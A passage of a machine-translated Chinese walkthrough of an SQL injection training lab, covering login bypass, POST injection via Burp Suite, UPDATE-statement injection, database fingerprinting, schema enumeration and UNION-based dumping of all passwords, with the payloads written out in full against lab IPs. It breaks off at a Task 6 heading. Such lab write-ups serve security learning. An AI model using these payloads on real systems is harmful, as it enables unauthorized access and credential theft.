translated">浏览器会自动为我们进行URL编码。因为HTTP协议不支持请求中的所有字符，所以需要Urlencoding。进行urlencoded时，URL如下所示:</p><p id="459f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用<strong class="ku ir"> HackBar 2扩展</strong>将您的有效负载转换成urlencode</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nr"><img src="../Images/154f7183ea1825ec7c3bba45fa66ff07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DAjl9JArXrlj5VsXiNFbyg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi gj"><img src="../Images/99598492b5faba5d7ba21754a4557ba2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*atU5YS_ZtzGbqDe0h6XWdA.png"/></div></div></figure><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="6d8b" class="lo lp iq mz b gy nd ne l nf ng">a'%20or%201%3d1%20--</span><span id="3de6" class="lo lp iq mz b gy nh ne l nf ng">10.10.231.136:5000/sesqli3/login?profileID=a'%20or%201%3d1%20--&amp;password=a</span></pre><p id="3af9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">%27变成单引号(')，而%20变成空格。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/654d9a743bcc0b06a50b7f5662be3929.png" data-original-src="https://miro.medium.com/v2/resize:fit:1366/format:webp/1*VbuRknj4tyAy-s52C1O75g.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/6eae6cc5013ff6c39bc41f5d2f175ead.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rcdLL7cVfb6-1M-jZhHQGg.png"/></div></div></figure><p id="5dc2" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">问题4</strong>:SQL注入4: POST注入的标志是什么？</p><p id="c117" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir"> SQL注入4: POST注入</strong>在提交这个挑战的登录表单时，它使用HTTP POST方法。可以删除/禁用验证登录表单的JavaScript，或者提交一个有效的请求并用代理工具(如Burp Suite)拦截并修改它:</p><p id="f70e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这意味着url将不显示任何参数</p><p id="3f6e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这就是为什么我们使用burpsuite来查看参数并更改它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/c62f924c22afdb2516c587b345bcd87a.png" data-original-src="https://miro.medium.com/v2/resize:fit:692/format:webp/1*LQIfFq-U4fKRkWnN60V8-Q.png"/></div></figure><p id="01d6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">捕获请求</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/cfea0ff53cc511db0446070df6dd0ebf.png" data-original-src="https://miro.medium.com/v2/resize:fit:928/format:webp/1*Ro7I30HFzkt-TY5UNWC-0A.png"/></div></figure><p id="8b40" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">用<strong class="ku ir">a’或1=1 — </strong>更改profileID</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/5083c5f7b1f963ff0df5b7ab78704c9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*pdVyx4kgYEsjBjsqXtfmvw.png"/></div></figure><p id="008e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">并点击转发</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nx"><img src="../Images/d2812957736706ec61b979df96db7477.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xl00q6nHWbu5oSvsrRpVIw.png"/></div></div></figure></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><h1 id="aa98" class="mi lp iq bd lq mj of ml lt mm og mo lw jw oh jx lz jz oi ka mc kc oj kd mf ms bi translated">任务SQL注入简介:第2部分</h1><p id="8b72" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">登录“SQL注入5:更新语句”挑战并利用易受攻击的配置文件页面来查找标志。可以使用的凭据有:</p><p id="7f1a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">profileID: <strong class="ku ir"> 10 </strong></p><p id="dfd7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">密码:<strong class="ku ir"> toor </strong></p><p id="9bc1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">这里必须完成为查找表和列名而演示的相同枚举，因为标志存储在另一个表中。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/36f3f19468b2886d43723828111c0049.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/format:webp/1*7eGK7OWc_iyCsFSOIAae4A.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ol"><img src="../Images/df529f0acac9febf1b35cdc90451892f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jicvqLe20ETQ000UQxqqjQ.png"/></div></div></figure><h2 id="6632" class="lo lp iq bd lq lr ls dn lt lu lv dp lw lb lx ly lz lf ma mb mc lj md me mf mg bi translated">对更新语句的SQL注入攻击</h2><p id="fdba" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">如果SQL注入发生在UPDATE语句上，损害可能会严重得多，因为它允许用户更改数据库中的记录。在员工管理应用程序中，有一个编辑个人资料页面，如下图所示。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi om"><img src="../Images/9f5948105f5c3de7bec7fbc656ad05d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:708/format:webp/0*zNIUrHPajocsbmy-.png"/></div></figure><p id="695c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">此编辑页面允许员工更新他们的信息，但他们不能访问所有可用字段，用户只能更改他们的信息。如果表单易受SQL注入攻击，攻击者可以绕过实现的逻辑，更新他们不应该更新的字段，或者为其他用户更新字段。</p><p id="80dc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们现在将通过配置文件页面上的UPDATE语句来枚举数据库。我们将假设我们没有数据库的先验知识。通过查看网页的源代码，我们可以通过查看name属性来识别潜在的列名。这些列不一定需要命名为this，但是很有可能命名为this，而且像“email”和“password”这样的列名并不少见，很容易被猜到。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi on"><img src="../Images/6fcc8e00e22c6aa752444d7c37be618f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*AxVJa5VzNjj_gC2y.png"/></div></div></figure><p id="89ee" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">为了确认表单易受攻击并且我们有有效的列名，我们可以尝试在昵称和电子邮件字段中插入类似以下代码的内容:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="1e81" class="lo lp iq mz b gy nd ne l nf ng">asd',nickName='test',email='hacked</span></pre><p id="c151" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当将恶意有效载荷注入昵称字段时，仅更新昵称。当注入电子邮件字段时，两个字段都会更新:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/bf6fcbda98c0a8ef550e5e65ed6ab59b.png" data-original-src="https://miro.medium.com/v2/resize:fit:846/format:webp/1*XCKHrW-C2yhyI8Nqx93IoQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi op"><img src="../Images/7c2916caab17d0aa630fcb31855a6b90.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/0*chE7RxRvfUO78b28.png"/></div></figure><p id="e402" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">第一个测试确认了应用程序易受攻击，并且我们有正确的列名。如果我们有错误的列名，那么任何字段都不会被更新。由于这两个字段都是在注入恶意负载后更新的，因此原始SQL语句可能类似于以下代码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="7d74" class="lo lp iq mz b gy nd ne l nf ng">UPDATE &lt;table_name&gt; SET nickName='name', email='email' WHERE &lt;condition&gt;</span></pre><p id="c3fa" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">有了这些知识，我们就可以尝试识别正在使用的数据库。有几种方法可以做到这一点，但最简单的方法是让数据库识别自己。以下查询可用于识别MySQL、MSSQL、Oracle和SQLite:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="fea4" class="lo lp iq mz b gy nd ne l nf ng"><strong class="mz ir"><em class="oq"># MySQL and MSSQL</em></strong></span><span id="d5f4" class="lo lp iq mz b gy nh ne l nf ng">',nickName=@@version,email='</span><span id="4454" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir"><em class="oq"># For Oracle</em></strong></span><span id="dc87" class="lo lp iq mz b gy nh ne l nf ng">',nickName=(SELECT banner FROM v$version),email='</span><span id="9621" class="lo lp iq mz b gy nh ne l nf ng"><strong class="mz ir"><em class="oq"># For SQLite</em></strong></span><span id="3e3a" class="lo lp iq mz b gy nh ne l nf ng">',nickName=sqlite_version(),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/d9b6329688cd8043947b08086008462e.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*LcXTZX8o0go14Z_mV3sN3g.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi or"><img src="../Images/ea0e7020693738fac3979b5626281e51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*h3aMy7mXY0Gr8-yWcgOkgA.png"/></div></div></figure><p id="9f3a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">知道我们在处理什么样的数据库，就更容易理解如何构造我们的恶意查询。我们可以通过提取所有的表来枚举数据库。在下面的代码中，我们执行一个子查询来从数据库中获取所有的表，并将它们放入昵称字段中。子查询包含在参数中。<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数用于同时转储所有的表。</p><blockquote class="os ot ou"><p id="a751" class="ks kt oq ku b kv kw jr kx ky kz ju la ov lc ld le ow lg lh li ox lk ll lm ln ij bi translated"><em class="iq">"</em><strong class="ku ir"><em class="iq"/></strong><a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir"><em class="iq">group _ concat()</em></strong></a><em class="iq">函数返回一个字符串，该字符串是x的所有非空值的串联。如果参数Y存在，则它用作x实例之间的分隔符。如果省略Y，则逗号("，")用作分隔符。连接元素的顺序是任意的。</em></p></blockquote><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="b43e" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oy"><img src="../Images/6cd9ffc0a44e21c80ced4cf080b07cb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:818/format:webp/1*tUnU-ZBpZRGeqOs8DanS8w.png"/></div></div></figure><p id="bf15" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过注入上面的代码，我们可以看到数据库中唯一的表叫做"<strong class="ku ir"> usertable </strong>和"<strong class="ku ir"> secrets" </strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oz"><img src="../Images/89a9fc49ef632effaa4cecc1263d3f28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2atoIHoEp2M6UPotVB4gZg.png"/></div></div></figure><p id="8e73" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后我们继续从<strong class="ku ir">用户表:</strong>中提取所有的列名</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="c2ce" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pa"><img src="../Images/8d937e9f1e180672063b9d67a9f0f0b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:806/format:webp/1*0iyaOR9NTl1RngsJneJ9NA.png"/></div></figure><p id="d64d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">正如下面可以看到的，用户表包含以下列:UID、name、profileID、salary、passportNr、email、nickName和password:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pb"><img src="../Images/67f968e722fde9433d5bcf09fb1ec41f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eKoGfDKXWq-NMLz7wF6rUw.png"/></div></div></figure><p id="1e1c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过知道列的名称，我们可以从数据库中提取我们想要的数据。例如，下面的查询将从secrets中提取profileID、名称和密码。子查询使用<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数同时转储所有信息，而<a class="ae kr" href="https://sqlite.org/lang_expr.html#operators" rel="noopener ugc nofollow" target="_blank"> || </a>运算符是“concatenate”——它将操作数<strong class="ku ir">(</strong><a class="ae kr" href="https://sqlite.org/lang_expr.html#operators" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">sqlite.org</strong></a><strong class="ku ir">)的字符串连接在一起。</strong></p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="1336" class="lo lp iq mz b gy nd ne l nf ng">',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/2c5033867e89a8c9f1d5c01a3dfc230a.png" data-original-src="https://miro.medium.com/v2/resize:fit:842/format:webp/1*IxxHH7Kv5jCvNuXWMc7rdQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pc"><img src="../Images/b1baaa4dc5aa8a5754b6f060f11f971a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eQLwaxB6eppxgjoTXpadMA.png"/></div></div></figure><p id="6e63" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们得到了<strong class="ku ir">旗帜</strong></p><h1 id="259e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务4:易受攻击的启动:身份验证被破坏</h1><p id="b7e8" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">从<a class="ae kr" href="http://MACHINE_IP:5000," rel="noopener ugc nofollow" target="_blank"> http://10.10.110.236:5000、</a>上的登陆页面，转到Track:Vulnerable Startup(<a class="ae kr" href="http://10.10.110.236:5000/challenge1/" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 110 . 236:5000/challenge 1/</a>)下的Broken Authentication。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/9fd64fa8f1cbd1556ff2104c0085ae3e.png" data-original-src="https://miro.medium.com/v2/resize:fit:686/format:webp/1*40lOA1erdwIY464aY1UjoA.png"/></div></figure><p id="e127" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">绕过登录并检索标志。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/fbeacc06ab0b50b45b8e3be672879288.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*K2E7rZLQKZJeisfx4p0POQ.png"/></div></figure><h1 id="2720" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务5:易受攻击的启动:身份验证被破坏2</h1><h1 id="5520" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">目标</h1><p id="470b" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">这个挑战建立在之前的挑战之上。这里的目标是找到一种方法，在不使用盲目注入的情况下，转储数据库中的所有密码来检索标志。</p><h1 id="637e" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">描述</h1><p id="9313" class="pw-post-body-paragraph ks kt iq ku b kv mt jr kx ky mu ju la lb mv ld le lf mw lh li lj mx ll lm ln ij bi translated">登录表单仍然易受SQL注入攻击，使用<strong class="ku ir"> ' </strong> <strong class="ku ir">或1 = 1—</strong>作为用户名可以绕过登录。</p><p id="719e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在转储所有密码之前，我们需要确定登录查询的结果在应用程序中返回的位置。登录后，当前登录用户的名称显示在右上角，因此可以将数据转储到那里，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/e2a7155754b8397e413fb679dbb5bd7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:662/format:webp/1*BPpcMWTDjU_dOMaNLuyCEw.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/90b6a546a78474f1d1f92f131f93018b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*dRA6Lz-p_lKd1tKu.png"/></div></div></figure><p id="88d7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">来自查询的数据也可以存储在会话cookie中。可以通过在浏览器中打开开发人员工具来提取会话cookie，这可以通过按F12来完成。然后导航到存储并复制会话cookie的值，如下所示:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pg"><img src="../Images/0d1bf711e5f63c1cf4961dc1e41be840.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qvFNwpmqCq7RQ9Q1Rjog-A.png"/></div></div></figure><p id="d91f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">然后可以在<a class="ae kr" href="https://www.kirsle.net/wizards/flask-session.cgi" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">https://www.kirsle.net/wizards/flask-session.cgi</strong></a>或通过自定义脚本解码cookie。通过访问<a class="ae kr" href="http://10.10.110.236:5000/download/decode_cookie.py" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">http://10 . 110 . 236:5000/download/decode _ cookie . py</strong></a>，可以在虚拟机内部下载用于解码cookie的脚本。</p><p id="617e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用用户名<strong class="ku ir">或1 = 1—</strong>登录后，可以在下面看到解码后的cookie，很明显来自登录查询的用户id和用户名被放在其中。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/ed44c3c2a571b4cce03663aae2b9dcea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1072/format:webp/1*Iic7yvgDFfljIL7MlLBfgA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/0aa91707ade80c492391c6a9eb8d2fa9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1208/format:webp/1*1JhY8znrlzLUPHDNDFzOsg.png"/></div></figure><p id="5a75" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">使用基于联盟的SQL注入可以转储密码。要使基于工会的注入发挥作用，必须满足两个关键要求:</p><ul class=""><li id="292c" class="pj pk iq ku b kv kw ky kz lb pl lf pm lj pn ln po pp pq pr bi translated">注入查询中的列数必须与原始查询中的列数相同</li><li id="1133" class="pj pk iq ku b kv ps ky pt lb pu lf pv lj pw ln po pp pq pr bi translated">每列的数据类型必须与相应的类型相匹配</li></ul><p id="bcfc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当登录到应用程序时，它执行下面的查询。从SQL语句中，我们可以看到它正在检索两列；id和用户名。</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="dc99" class="lo lp iq mz b gy nd ne l nf ng">SELECT <strong class="mz ir">id</strong>, username FROM users WHERE username = '" + username + "' AND password = '" + password + "'</span></pre><p id="4435" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">一个一个地试试这个</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="7aa0" class="lo lp iq mz b gy nd ne l nf ng">1' UNION SELECT NULL-- -</span><span id="300a" class="lo lp iq mz b gy nh ne l nf ng">1' UNION SELECT NULL, NULL-- -</span><span id="84f9" class="lo lp iq mz b gy nh ne l nf ng">1' UNION SELECT NULL, NULL, NULL-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi px"><img src="../Images/795dfcb2d8bdb7ccb947ab290aaf3255.png" data-original-src="https://miro.medium.com/v2/resize:fit:716/format:webp/1*BmasvN3w0XEkRS7FPFPpAQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi py"><img src="../Images/f239b2d0b89d3f2c94365e9942480ddf.png" data-original-src="https://miro.medium.com/v2/resize:fit:782/format:webp/1*cuzgdbZhfT0hUIvoG9NGNg.png"/></div></figure><p id="4d9b" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">它显示查询已执行。在这种情况下，成功意味着当注入正确数量的列时，应用程序将成功登录。在其他情况下，如果启用了错误消息，当注入的列数不正确时，可能会显示一条警告，指出“UNION左侧和右侧的选择没有相同的结果列数”。</p><p id="e8a8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过使用<strong class="ku ir">UNION SELECT 1，2 — - </strong>作为用户名，我们匹配了原始SQL查询中的列数，应用程序允许我们进入。登录后，我们可以看到用户名被替换为整数2，这是我们在注入查询中用作第二列的内容。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/40d8d3a415733bb40226c5edf6e435e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:704/format:webp/1*Rs83arR9OoDKTvRm_Pxuzg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qa"><img src="../Images/34bc48e8725fe4651652d36885e75cd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ri37zo9gTGXJ-5gWRAZDZw.png"/></div></div></figure><p id="7da1" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">会话cookie中的用户名也是如此。通过解码，我们可以看到用户名已经被替换为与上面相同的值</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qb"><img src="../Images/f3504468476dbfb9b002940d5d06673e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ro9W7h8QQa4n-DJK_ks55g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/1d2e8257211cd9ea31cc329f1e28dbf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/format:webp/1*FGaK6MHAdeut0-hMQH5h_Q.png"/></div></figure><p id="1211" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">枚举数据库以查找表和列，就像我们在任务2 SQL注入介绍中所做的那样。像<a class="ae kr" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" rel="noopener ugc nofollow" target="_blank"><strong class="ku ir">payloads all things</strong></a><strong class="ku ir"/>这样的备忘单对此很有帮助。挑战的目标是转储所有密码以获得标志，所以在这种情况下，我们将猜测列名是<em class="oq">密码</em>，表名是<em class="oq">用户</em>。按照这种逻辑，可以使用以下代码转储密码:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="3167" class="lo lp iq mz b gy nd ne l nf ng">' UNION SELECT 1, password from users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/1d583613e383a6459528c1a2aba4846f.png" data-original-src="https://miro.medium.com/v2/resize:fit:682/format:webp/1*_iIZWMHu3EA0aKpDA0vMpA.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qe"><img src="../Images/30438f4776a3ab91c3cbe842e0ac045c.png" data-original-src="https://miro.medium.com/v2/resize:fit:832/format:webp/1*LhOc1JS4YjjjipSrsrrQWA.png"/></div></figure><p id="2ade" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">但是，前面的语句只会返回一个密码。<a class="ae kr" href="https://sqlite.org/lang_aggfunc.html#groupconcat" rel="noopener ugc nofollow" target="_blank"> group_concat() </a>函数可以帮助实现同时转储所有密码的目的。</p><p id="d284" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过将以下代码插入用户名字段:</p><pre class="kg kh ki kj gt my mz na nb aw nc bi"><span id="22ea" class="lo lp iq mz b gy nd ne l nf ng">' UNION SELECT 1,group_concat(password) FROM users-- -</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qf"><img src="../Images/a6920612675818281abfccec0e618918.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QAmdkWGzACCyBohHbX_OjA.png"/></div></div></figure><p id="4b8f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣！我们得到了<strong class="ku ir">标志</strong></p><h1 id="f0dc" class="mi lp iq bd lq mj mk ml lt mm mn mo lw jw mp jx lz jz mq ka mc kc mr kd mf ms bi translated">任务6:易受攻击的启动:被破坏的认证3(盲目注入)</h1><h1 id="5b3d" class="mi lp iq 